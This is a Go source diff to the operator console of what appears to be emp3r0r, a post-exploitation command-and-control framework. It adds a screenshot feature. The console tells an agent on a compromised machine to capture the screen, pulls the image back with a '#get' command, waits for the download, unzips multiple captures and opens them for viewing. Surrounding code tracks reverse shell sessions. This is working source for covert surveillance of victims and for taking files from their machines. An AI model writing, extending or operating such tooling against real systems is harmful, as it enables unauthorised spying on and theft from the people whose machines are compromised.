@@ -7,6 +7,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
@@ -14,6 +15,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/mholt/archiver"
 	"github.com/olekukonko/tablewriter"
 )
 
@@ -57,6 +59,52 @@ func processAgentData(data *agent.MsgTunData) {
 		if strings.HasPrefix(cmd, "bash") {
 			shellToken := strings.Split(cmd, " ")[1]
 			RShellStatus[shellToken] = fmt.Errorf("Reverse shell error: %v", out)
+		}
+
+		// ps command
+		if strings.HasPrefix(cmd, "screenshot") {
+			if strings.Contains(out, "Error") {
+				CliPrintError(out)
+				return
+			}
+			CliPrintInfo("We will get %s screenshot file for you", strconv.Quote(out))
+			err = SendCmd("#get "+out, agent)
+			if err != nil {
+				CliPrintError("Get screenshot: %v", err)
+				return
+			}
+
+			// be sure we have downloaded the file
+			for {
+				time.Sleep(100 * time.Millisecond)
+				if !util.IsFileExist(FileGetDir+out+".emp3r0r") &&
+					util.IsFileExist(FileGetDir+out) {
+					break
+				}
+			}
+
+			// unzip if it's zip
+			if strings.HasSuffix(out, ".zip") {
+				err = archiver.Unarchive(FileGetDir+out, FileGetDir)
+				if err != nil {
+					CliPrintError("Unarchive screenshot zip: %v", err)
+					return
+				}
+				CliPrintWarning("Multiple screenshots extracted to %s", FileGetDir)
+				return
+			}
+
+			// open it if possible
+			if util.IsCommandExist("xdg-open") &&
+				os.Getenv("DISPLAY") != "" {
+				CliPrintSuccess("Seems like we can open the picture for you to view, hold on")
+				cmd := exec.Command("xdg-open", FileGetDir+out)
+				err = cmd.Start()
+				if err != nil {
+					CliPrintError("Crap, we cannot open the picture: %v", err)
+					return
+				}
+			}
 		}
 
 		// ps command
@@ -176,6 +224,12 @@ func processAgentData(data *agent.MsgTunData) {
 			CliPrintError("processAgentData failed to decode file data: %v", err)
 			return
 		}
+		temp := FileGetDir + filename + ".emp3r0r"
+
+		defer func() {
+			// clean up temp file
+			_ = os.Remove(temp)
+		}()
 
 		// save to /tmp for security
 		if _, err := os.Stat(FileGetDir); os.IsNotExist(err) {
@@ -184,6 +238,10 @@ func processAgentData(data *agent.MsgTunData) {
 				CliPrintError("mkdir -p /tmp/emp3r0r/file-get: %v", err)
 				return
 			}
+		}
+		err = ioutil.WriteFile(temp, []byte("downloading"), 0600)
+		if err != nil {
+			CliPrintWarning("%v", err)
 		}
 		err = ioutil.WriteFile(FileGetDir+filename, filedata, 0600)
 		if err != nil {
